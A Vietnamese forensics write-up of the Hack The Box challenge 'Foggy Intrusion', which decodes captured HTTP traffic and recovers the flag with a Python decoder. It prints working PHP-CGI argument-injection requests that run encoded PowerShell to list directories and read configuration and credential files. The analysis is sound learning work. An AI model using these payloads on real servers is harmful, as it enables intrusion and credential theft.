> [!NOTE]
> - Mức độ: Dễ 
> - Loại: Forensics 
> - Url: [Foggy Intrusion](https://app.hackthebox.com/challenges/Foggy%2520Intrusion)
> - Tình huống: Vào một đêm Halloween sương mù bao phủ, một địa điểm được bảo vệ nghiêm ngặt đã bị xâm nhập trái phép dưới màn đêm tĩnh mịch. Trong khi thế giới bên ngoài chìm vào sự im lặng, một kẻ đột nhập đã vượt qua các quy trình an ninh và tác động vào những khu vực nhạy cảm, để lại trong các tệp nhật ký những dấu vết vừa có thể truy xuất được, lại vừa đầy khó hiểu.
> - Mô tả: Phân tích các gói tin, tìm hiểu thuật toán mã hóa và giải mã chúng 

> - Dựa vào Properties của file biết nó được ghi bởi máy Windows 10 
> - Các packet trong file đều là các trao đổi http 
> - Trong đó chỉ có luồng `tcp.stream eq 5` là đáng chú ý 

> - Phân tích req-res đầu tiên trong luồng 
> - Tải lên mã php thực hiện 1 danh sách lệnh đã được mã hóa base64 

```
POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
Accept-Encoding: identity
Host: halloweencorp.htb
User-Agent: curl/8.3.0
Accept: /
Content-Length: 636
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

<?php echo shell_exec(base64_decode('cG93ZXJzaGVsbC5leGUgLUMgIiRvdXRwdXQgPSBHZXQtQ2hpbGRJdGVtIC1QYXRoIEM6OyAkYnl0ZXMgPSBbVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJG91dHB1dCk7ICRjb21wcmVzc2VkU3RyZWFtID0gW1N5c3RlbS5JTy5NZW1vcnlTdHJlYW1dOjpuZXcoKTsgJGNvbXByZXNzb3IgPSBbU3lzdGVtLklPLkNvbXByZXNzaW9uLkRlZmxhdGVTdHJlYW1dOjpuZXcoJGNvbXByZXNzZWRTdHJlYW0sIFtTeXN0ZW0uSU8uQ29tcHJlc3Npb24uQ29tcHJlc3Npb25Nb2RlXTo6Q29tcHJlc3MpOyAkY29tcHJlc3Nvci5Xcml0ZSgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpOyAkY29tcHJlc3Nvci5DbG9zZSgpOyAkY29tcHJlc3NlZEJ5dGVzID0gJGNvbXByZXNzZWRTdHJlYW0uVG9BcnJheSgpOyBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRjb21wcmVzc2VkQnl0ZXMpIg==')); ?>
HTTP/1.1 302 Found
Date: Fri, 13 Sep 2024 21:12:37 GMT
Server: Apache/2.4.58 (Win64) OpenSSL/3.1.3
X-Powered-By: PHP/8.1.25
Location: http://halloweencorp.htb/dashboard/
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8

69
FchbCsAgDAXRrWQF2VN8XzAajLTS1bf9GTiTxFuYshJBK905SMeTFx1RMxKzjigbczi3rZ0C9hAFR3eKcxRUtmZU5MJH/kIYKZ//vg==

0


POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
Accept-Encoding: identity
Host: halloweencorp.htb
User-Agent: curl/8.3.0
Accept: /
Content-Length: 644
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

<?php echo shell_exec(base64_decode('cG93ZXJzaGVsbC5leGUgLUMgIiRvdXRwdXQgPSBHZXQtQ2hpbGRJdGVtIC1QYXRoIEM6XHhhbXBwOyAkYnl0ZXMgPSBbVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJG91dHB1dCk7ICRjb21wcmVzc2VkU3RyZWFtID0gW1N5c3RlbS5JTy5NZW1vcnlTdHJlYW1dOjpuZXcoKTsgJGNvbXByZXNzb3IgPSBbU3lzdGVtLklPLkNvbXByZXNzaW9uLkRlZmxhdGVTdHJlYW1dOjpuZXcoJGNvbXByZXNzZWRTdHJlYW0sIFtTeXN0ZW0uSU8uQ29tcHJlc3Npb24uQ29tcHJlc3Npb25Nb2RlXTo6Q29tcHJlc3MpOyAkY29tcHJlc3Nvci5Xcml0ZSgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpOyAkY29tcHJlc3Nvci5DbG9zZSgpOyAkY29tcHJlc3NlZEJ5dGVzID0gJGNvbXByZXNzZWRTdHJlYW0uVG9BcnJheSgpOyBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRjb21wcmVzc2VkQnl0ZXMpIg==')); ?>
HTTP/1.1 302 Found
Date: Fri, 13 Sep 2024 21:12:38 GMT
Server: Apache/2.4.58 (Win64) OpenSSL/3.1.3
X-Powered-By: PHP/8.1.25
Location: http://halloweencorp.htb/dashboard/
Keep-Alive: timeout=5, max=99
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8

151
bZFrcsMgDISvogvEV2JkUGNNeBWJxOnpizFx3Ez/8a3YFRIYU3yGVAUwo10I7JUvM0ewKWrhGRZ1yQpwuAJHUfQePFuKQgI+WfQEAdmnqrlqP2pyLDcIT/n2kJcMUixoyPCg2eF9NDItq+g0o76FlDtbbG04ohEq99brQzx8J+nlVC+2cN7rX+zph73fgrTmT+3IOWsj6NYwl2RJpHOgYmt5nkxvZVj6vOcLg0c5o8gjFSeTro1KylSUSSaODIXQBTKOenEQxU6vJdBK0OcwK4a8hyqJmrbiDjWOD5rcH9qM3XLpf5r+U7ZHdMXIQs2z5Q3uAx2OfaCGvw==

0


POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
Accept-Encoding: identity
Host: halloweencorp.htb
User-Agent: curl/8.3.0
Accept: /
Content-Length: 660
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

<?php echo shell_exec(base64_decode('cG93ZXJzaGVsbC5leGUgLUMgIiRvdXRwdXQgPSBHZXQtQ29udGVudCAtUGF0aCBDOlx4YW1wcFxwcm9wZXJ0aWVzLmluaTsgJGJ5dGVzID0gW1RleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCRvdXRwdXQpOyAkY29tcHJlc3NlZFN0cmVhbSA9IFtTeXN0ZW0uSU8uTWVtb3J5U3RyZWFtXTo6bmV3KCk7ICRjb21wcmVzc29yID0gW1N5c3RlbS5JTy5Db21wcmVzc2lvbi5EZWZsYXRlU3RyZWFtXTo6bmV3KCRjb21wcmVzc2VkU3RyZWFtLCBbU3lzdGVtLklPLkNvbXByZXNzaW9uLkNvbXByZXNzaW9uTW9kZV06OkNvbXByZXNzKTsgJGNvbXByZXNzb3IuV3JpdGUoJGJ5dGVzLCAwLCAkYnl0ZXMuTGVuZ3RoKTsgJGNvbXByZXNzb3IuQ2xvc2UoKTsgJGNvbXByZXNzZWRCeXRlcyA9ICRjb21wcmVzc2VkU3RyZWFtLlRvQXJyYXkoKTsgW0NvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZygkY29tcHJlc3NlZEJ5dGVzKSI=')); ?>
HTTP/1.1 302 Found
Date: Fri, 13 Sep 2024 21:12:39 GMT
Server: Apache/2.4.58 (Win64) OpenSSL/3.1.3
X-Powered-By: PHP/8.1.25
Location: http://halloweencorp.htb/dashboard/
Keep-Alive: timeout=5, max=98
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8

1ad
hZJdb4IwFIb/Sv8AguKcWdILs4vtYiYsu1kihBxLlcbS1rZM+fcrH92I8SNcQM/z9HDewuaNCqqBZ4gJY4Hzgmn8+pKeoVIKbcHQ3JXJIRdQUfy9WifJuHqgDR6vf6g2TAq8nEwns6cgGjPFwe6krvCJiUKeTHBezNFmpYCUNEPQ3XNDteuRK6ktXkYXVWN4T+bz2CMtpc3d0JRYqRscdoOHPfROaQtJzMjyAcOeeK+QFTDRJZ3OnieRu6aeESl2bF9rsC7ftVa9F7ae31MLdqz76Rmh/RGizbr5+vzIUNWY4xAnjqPFsC6lsZhLArx9GooXGf0r044OzpYJ0M1NK3V8MAuwcNtr6SA+jNxp4X9n0Pu6osIaHNSoHRoFCRqFu34eyXuSIVWqOxEc7YxHE/2J9GypaP/Ea1+9tVJn/AI=

0


POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
Accept-Encoding: identity
Host: halloweencorp.htb
User-Agent: curl/8.3.0
Accept: /
Content-Length: 664
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

<?php echo shell_exec(base64_decode('cG93ZXJzaGVsbC5leGUgLUMgIiRvdXRwdXQgPSBHZXQtQ29udGVudCAtUGF0aCBDOlx4YW1wcFxodGRvY3NcY29uZmlnLnBocDsgJGJ5dGVzID0gW1RleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCRvdXRwdXQpOyAkY29tcHJlc3NlZFN0cmVhbSA9IFtTeXN0ZW0uSU8uTWVtb3J5U3RyZWFtXTo6bmV3KCk7ICRjb21wcmVzc29yID0gW1N5c3RlbS5JTy5Db21wcmVzc2lvbi5EZWZsYXRlU3RyZWFtXTo6bmV3KCRjb21wcmVzc2VkU3RyZWFtLCBbU3lzdGVtLklPLkNvbXByZXNzaW9uLkNvbXByZXNzaW9uTW9kZV06OkNvbXByZXNzKTsgJGNvbXByZXNzb3IuV3JpdGUoJGJ5dGVzLCAwLCAkYnl0ZXMuTGVuZ3RoKTsgJGNvbXByZXNzb3IuQ2xvc2UoKTsgJGNvbXByZXNzZWRCeXRlcyA9ICRjb21wcmVzc2VkU3RyZWFtLlRvQXJyYXkoKTsgW0NvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZygkY29tcHJlc3NlZEJ5dGVzKSI=')); ?>
HTTP/1.1 302 Found
Date: Fri, 13 Sep 2024 21:12:40 GMT
Server: Apache/2.4.58 (Win64) OpenSSL/3.1.3
X-Powered-By: PHP/8.1.25
Location: http://halloweencorp.htb/dashboard/
Keep-Alive: timeout=5, max=97
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8

131
dY9RS8MwFIX/ynUIyWDKZNkYTjdSW/DFKe3Ux0ttbligpjVtGTL2311a58bA+xIO37nnntwtynUJirSxxFkYYBLFb1HMBsDUB+vPTtHrni3lU9RBbCpyZ44XmSTvz3HoHY+rYKuHE1Q3Y1GWI+FGCoVVqHMxwY2oUA8bqy52ZxGhXMlAJu2RdBwsU6W9Ay4/v6uv3MA9WNpAJ/hf3wGc9GvFoUorDqE+yGjgv2FX86ywlrIaybnC9WELfpQh3nvoiCks6NTkpG6hB9fwz+YMdnBkFdWYrVO3fzlraj31P1jMfwA=

0


POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
Accept-Encoding: identity
Host: halloweencorp.htb
User-Agent: curl/8.3.0
Accept: /
Content-Length: 612
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

<?php echo shell_exec(base64_decode('cG93ZXJzaGVsbC5leGUgLUMgIiRvdXRwdXQgPSB3aG9hbWk7ICRieXRlcyA9IFtUZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygkb3V0cHV0KTsgJGNvbXByZXNzZWRTdHJlYW0gPSBbU3lzdGVtLklPLk1lbW9yeVN0cmVhbV06Om5ldygpOyAkY29tcHJlc3NvciA9IFtTeXN0ZW0uSU8uQ29tcHJlc3Npb24uRGVmbGF0ZVN0cmVhbV06Om5ldygkY29tcHJlc3NlZFN0cmVhbSwgW1N5c3RlbS5JTy5Db21wcmVzc2lvbi5Db21wcmVzc2lvbk1vZGVdOjpDb21wcmVzcyk7ICRjb21wcmVzc29yLldyaXRlKCRieXRlcywgMCwgJGJ5dGVzLkxlbmd0aCk7ICRjb21wcmVzc29yLkNsb3NlKCk7ICRjb21wcmVzc2VkQnl0ZXMgPSAkY29tcHJlc3NlZFN0cmVhbS5Ub0FycmF5KCk7IFtDb252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoJGNvbXByZXNzZWRCeXRlcyki')); ?>
HTTP/1.1 302 Found
Date: Fri, 13 Sep 2024 21:12:41 GMT
Server: Apache/2.4.58 (Win64) OpenSSL/3.1.3
X-Powered-By: PHP/8.1.25
Location: http://halloweencorp.htb/dashboard/
Keep-Alive: timeout=5, max=96
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8

21
S0ktzi7JL9AtyM3PzDFIiSktLjIwBAA=

0

```

> - Giải mã các lệnh đã được mã hóa 
> - Lệnh chạy chương trình powershell và truyền vào danh sách các lệnh 
> - Và cách xử lý chung là sẽ chạy lệnh, nén dữ liệu đầu ra bằng Deflate, mã hóa dữ liệu bằng base64 và trả về 
> - Danh sách các lệnh đã thực hiện
> 	- Liệt kê thư mục chính 
> 	- Liệt kê thư mục `xampp`
> 	- Đọc file `C:\xampp\properties.ini`
> 	- Đọc file `C:\xampp\htdocs\config.php`
> 	- Thực thi lệnh `whoami` biết người dùng hiện tại 

```powershell
powershell.exe -C "
$output = Get-ChildItem -Path C:; 
$bytes = [Text.Encoding]::UTF8.GetBytes($output); 
$compressedStream = [System.IO.MemoryStream]::new(); 
$compressor = [System.IO.Compression.DeflateStream]::new($compressedStream, [System.IO.Compression.CompressionMode]::Compress); 
$compressor.Write($bytes, 0, $bytes.Length); $compressor.Close(); $compressedBytes = $compressedStream.ToArray(); [Convert]::ToBase64String($compressedBytes)"

powershell.exe -C 
"
$output = Get-ChildItem -Path C:\xampp; #Liệt kê tệp và thư mục trong xampp 
$bytes = [Text.Encoding]::UTF8.GetBytes($output);# Chuyển đầu ra thành mảng bytes UTF-8 
$compressedStream = [System.IO.MemoryStream]::new();#Tạo một MemoryStream để lưu dữ liệu trong RAM
$compressor = [System.IO.Compression.DeflateStream]::new($compressedStream, [System.IO.Compression.CompressionMode]::Compress);#Tạo đối tượng DeflateStream để nén dữ liệu theo Deflate với mode CompressionMode
$compressor.Write($bytes, 0, $bytes.Length);# Nén dữ liệu 
$compressor.Close();# Đóng luồng nén hoàn tất nén dữ liệu 
$compressedBytes = $compressedStream.ToArray();#Tạo mảng bytes từ nội dung trong memory stream
[Convert]::ToBase64String($compressedBytes)#Chuyển mảng byte thành chuỗi Base64
"

powershell.exe -C "
$output = Get-Content -Path C:\xampp\properties.ini; 
$bytes = [Text.Encoding]::UTF8.GetBytes($output); 
$compressedStream = [System.IO.MemoryStream]::new(); 
$compressor = [System.IO.Compression.DeflateStream]::new($compressedStream, [System.IO.Compression.CompressionMode]::Compress); 
$compressor.Write($bytes, 0, $bytes.Length); 
$compressor.Close(); 
$compressedBytes = $compressedStream.ToArray(); [Convert]::ToBase64String($compressedBytes)"

powershell.exe -C "
$output = Get-Content -Path C:\xampp\htdocs\config.php; 
$bytes = [Text.Encoding]::UTF8.GetBytes($output); 
$compressedStream = [System.IO.MemoryStream]::new(); 
$compressor = [System.IO.Compression.DeflateStream]::new($compressedStream, [System.IO.Compression.CompressionMode]::Compress); 
$compressor.Write($bytes, 0, $bytes.Length); 
$compressor.Close(); 
$compressedBytes = $compressedStream.ToArray(); [Convert]::ToBase64String($compressedBytes)"

powershell.exe -C "
$output = whoami; 
$bytes = [Text.Encoding]::UTF8.GetBytes($output); 
$compressedStream = [System.IO.MemoryStream]::new(); 
$compressor = [System.IO.Compression.DeflateStream]::new($compressedStream, [System.IO.Compression.CompressionMode]::Compress); 
$compressor.Write($bytes, 0, $bytes.Length); 
$compressor.Close(); 
$compressedBytes = $compressedStream.ToArray(); [Convert]::ToBase64String($compressedBytes)"
```

> - Tạo chương trình giải mã dữ liệu trả về
> 	- Decode base64 
> 	- Decompressed dữ liệu đã nén 
> 	- Chuyển sang dạng mã hóa `utf-8` in dạng chữ đọc được 

```python
import base64
import zlib
import sys

print("python3 decrypt.py <encryptData>")
encryptData = sys.argv[1]

compressed_bytes = base64.b64decode(encryptData)
print("[+] Decode Base64")

decompressed_bytes = zlib.decompress(compressed_bytes, wbits=-zlib.MAX_WBITS)
print("[+] Decompressed")

plain = decompressed_bytes.decode("utf-8", errors="replace")
print(f"[+] Plain: {plain}")
```

> - Dữ liệu giải mã các response
> - Ta thấy kẻ tấn công đọc được các dữ liệu xác thực csdl, các file cầu hình.
> - Lấy được flag `HTB{f06_d154pp34r3d_4nd_fl46_w4s_f0und!}` 

```
dashboard img webalizer xampp applications.html bitnami.css config.php favicon.ico index.php

anonymous apache cgi-bin contrib htdocs img install licenses locale mailoutput mailtodisk mysql php src tmp webdav apache_start.bat apache_stop.bat catalina_service.bat catalina_start.bat catalina_stop.bat ctlscript.bat filezilla_setup.bat filezilla_start.bat filezilla_stop.bat killprocess.bat mercury_start.bat mercury_stop.bat mysql_start.bat mysql_stop.bat passwords.txt properties.ini readme_de.txt readme_en.txt service.exe setup_xampp.bat test_php.bat uninstall.dat uninstall.exe xampp-control.exe xampp-control.ini xampp_shell.bat xampp_start.exe xampp_stop.exe

[General] installdir=C:\xampp base_stack_name=XAMPP base_stack_key= base_stack_version=8.1.25-0 base_stack_platform=windows-x64 [Apache] apache_server_port=80 apache_server_ssl_port=443 apache_root_directory=/xampp/apache apache_htdocs_directory=C:\xampp/htdocs apache_domainname=127.0.0.1 apache_configuration_directory=C:\xampp/apache/conf apache_unique_service_name= [MySQL] mysql_port=3306 mysql_host=localhost mysql_root_directory=C:\xampp\mysql mysql_binary_directory=C:\xampp\mysql\bin mysql_data_directory=C:\xampp\mysql\data mysql_configuration_directory=C:\xampp/mysql/bin mysql_arguments=-u root -P 3306 mysql_unique_service_name= [PHP] php_binary_directory=C:\xampp\php php_configuration_directory=C:\xampp\php php_extensions_directory=C:\xampp\php\ext

<?php define('DB_SERVER', 'db'); define('DB_USERNAME', 'db_user'); define('DB_PASSWORD', 'HTB{f06_d154pp34r3d_4nd_fl46_w4s_f0und!}'); define('DB_DATABASE', 'a5BNadf');  $mysqli = new mysqli(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_DATABASE);  if ($mysqli->connect_error) {     die("Connection failed: " . $mysqli->connect_error); }  $mysqli->set_charset('utf8'); ?>

desktop-pmoil0d\usr01
```